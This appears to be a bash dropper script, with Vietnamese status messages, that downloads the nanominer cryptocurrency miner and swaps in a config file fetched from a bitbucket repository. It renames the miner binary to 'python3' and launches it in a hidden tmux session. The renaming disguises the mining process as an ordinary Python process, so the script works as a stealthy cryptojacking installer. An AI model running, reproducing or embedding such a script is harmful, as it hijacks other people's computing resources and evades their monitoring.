#! /bin/bash
set -x #echo on
if [ -f ${PWD}/nanominer-linux-1.5.1.tar.gz ]; then
    if pgrep -x "python3" > /dev/null
then
    echo "scrip dang chay roi , ke cmn di "
    
else

echo "script da install , chay thoi "
cd nanominer-linux-1.5.1
tmux new-session -d -s my_session1  './python3'
     
fi
exit
fi
sudo apt-get install tmux  -y
wget https://github.com/nanopool/nanominer/releases/download/v1.5.1/nanominer-linux-1.5.1.tar.gz
tar xvzf nanominer-linux-1.5.1.tar.gz
cd nanominer-linux-1.5.1
rm config.ini
wget https://bitbucket.org/evilbaby1/openai/raw/3fe4365a056b4e0589f78d6b1280f97cb1bb0b3e/config.ini
chmod +x nanominer
mv nanominer python3 
tmux new-session -d -s my_session1  './python3'
